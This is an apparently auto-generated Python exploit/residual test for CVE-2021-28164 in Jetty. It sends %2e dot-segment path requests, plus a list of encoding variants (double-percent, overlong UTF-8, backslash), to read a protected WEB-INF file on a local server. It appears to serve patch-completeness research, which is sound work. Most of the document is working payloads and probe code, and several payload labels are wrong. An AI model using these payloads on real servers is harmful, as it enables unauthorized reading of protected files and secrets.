[GIVEN] CVE-2021-28164 seed exploit — %2e-encoded dot segment before WEB-INF.

Jetty's authorization/protected-target check (ContextHandler.isProtectedTarget)
runs BEFORE the request URI is fully decoded+normalized. With the default
compliance mode, a `%2e` segment decodes to `.`, so the guard sees a path that
does not literally start with WEB-INF, yet the DefaultServlet then normalizes
`/./WEB-INF/...` -> `/WEB-INF/...` and serves the protected file.

Contract: reaches the planted canary (WEB-INF/pcb-secret.txt) on V0
(jetty 9.4.38); BLOCKED on V1 (jetty 9.4.39), where the CVE-2021-28164 fix
rejects the `%2e` dot-segment reaching WEB-INF. This is the seed the
system-under-test is given.

"""Residual test: auto-generated by static pipeline.

Path: /%2e/WEB-INF/pcb-secret.txt
Method: GET
O obligations: []
O removed: []
N limit: 4
A_paper version: 1.0
"""

import os
import sys
import json
import urllib.request
import urllib.error

BASE_URL = os.environ.get("BASE_URL", "http://localhost:8080")
MARKER = os.environ.get("MARKER", "")
MAX_ATTEMPTS = 4

# Obligation set from AST diff
O_ADDED = []
O_REMOVED = []

# A_paper candidates (encoding families on dangerous spans)
A_PAPER = [
    "%2F%25%32%65%2F%57%45%42%2D%49%4E%46%2F%70%63%62%2D%73%65%63%72%65%74%2E%74%78%74",  # percent-full
    "%252F%2525%2532%2565%252F%2557%2545%2542%252D%2549%254E%2546%252F%2570%2563%2562%252D%2573%2565%2563%2572%2565%2574%252E%2574%2578%2574",  # double-percent-full
    "/%2e/WEB-INF/pcb-secret.txt",  # html-numeric-full
    "%2F%2e/WEB-INF/pcb-secret.txt",  # percent@0
    "%252F%2e/WEB-INF/pcb-secret.txt",  # double-percent@0
    "%C0%AF%2e/WEB-INF/pcb-secret.txt",  # overlong-utf8-2@0
    "%E0%80%AF%2e/WEB-INF/pcb-secret.txt",  # overlong-utf8-3@0
    "\\u002F%2e/WEB-INF/pcb-secret.txt",  # unicode-escape@0
    "/%2e/WEB-INF/pcb-secret.txt",  # html-numeric@0
    "/%2e/WEB-INF/pcb-secret.txt",  # html-hex@0
    "/%2e/WEB-INF/pcb-secret.txt",  # html-named@0
    "\\/%2e/WEB-INF/pcb-secret.txt",  # backslash@0
]

# A_code candidates (source literals)
A_CODE = [
    "src/test/webapp",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java
    "/",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java
    "GET /test.xml HTTP/1.1",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java
    "GET /%2e/%2e/test.xml HTTP/1.1",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java
    "GET /foo/%2e%2e/test.xml HTTP/1.1",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java
    "GET /WEB-INF HTTP/1.1",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java
    "GET /WEB-INF/ HTTP/1.1",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java
    "GET /WEB-INF/test.xml HTTP/1.1",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java
    "GET /web-inf/test.xml HTTP/1.1",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java
    "GET /%2e/WEB-INF/test.xml HTTP/1.1",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java
    "GET /%2e/%2e/WEB-INF/test.xml HTTP/1.1",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java
    "GET /foo/%2e%2e/WEB-INF/test.xml HTTP/1.1",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java
]

SIBLINGS = []


def probe(candidate_value: str) -> dict:
    """Send a black-box probe to V1 via GET /%2e/WEB-INF/pcb-secret.txt."""
    url = BASE_URL.rstrip("/") + candidate_value
    req = urllib.request.Request(url, method="GET")
    req.add_header("User-Agent", "residual-test/1.0")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            headers = dict(resp.headers)
            return {"status": resp.status, "body": body, "headers": headers}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return {"status": e.code, "body": body, "headers": dict(e.headers)}
    except Exception as e:
        return {"status": "error", "body": str(e), "headers": {}}


def check_effect(response: dict) -> dict:
    """Check if the external effect marker appears in response."""
    body = response.get("body", "")
    headers = response.get("headers", {})
    
    # Check body for marker
    if MARKER and MARKER in body:
        return {"found": True, "location": "body", "marker": MARKER}
    
    # Check headers for marker
    for hname, hval in headers.items():
        if MARKER and MARKER in str(hval):
            return {"found": True, "location": f"header:{hname}", "marker": MARKER}
    
    return {"found": False}


def run():
    """Run candidates against V1, up to N attempts."""
    witnesses = []
    attempts = 0
    
    all_candidates = []
    for c in A_PAPER:
        all_candidates.append(("a_paper", c))
    for c in A_CODE:
        all_candidates.append(("a_code", c))
    for c in SIBLINGS:
        all_candidates.append(("sibling", c))
    
    for source, candidate in all_candidates:
        if attempts >= MAX_ATTEMPTS:
            break
        
        attempts += 1
        resp = probe(candidate)
        effect = check_effect(resp)
        
        result = {
            "candidate": candidate,
            "source": source,
            "status": resp["status"],
            "effect": effect,
        }
        
        if effect.get("found"):
            # Check obligation binding
            bound_o = None
            for o_lit in O_ADDED + O_REMOVED:
                if o_lit in candidate or any(o_lit in str(v) for v in [candidate]):
                    bound_o = o_lit
                    break
            result["obligation_binding"] = bound_o
            result["verdict"] = "witness" if bound_o else "effect_only"
            witnesses.append(result)
        else:
            result["verdict"] = "no_effect"
    
    return {
        "attempts": attempts,
        "witnesses": witnesses,
        "total_candidates": len(all_candidates),
    }


if __name__ == "__main__":
    if not MARKER:
        print("Warning: MARKER not set", file=sys.stderr)
    result = run()
    print(json.dumps(result, indent=2))
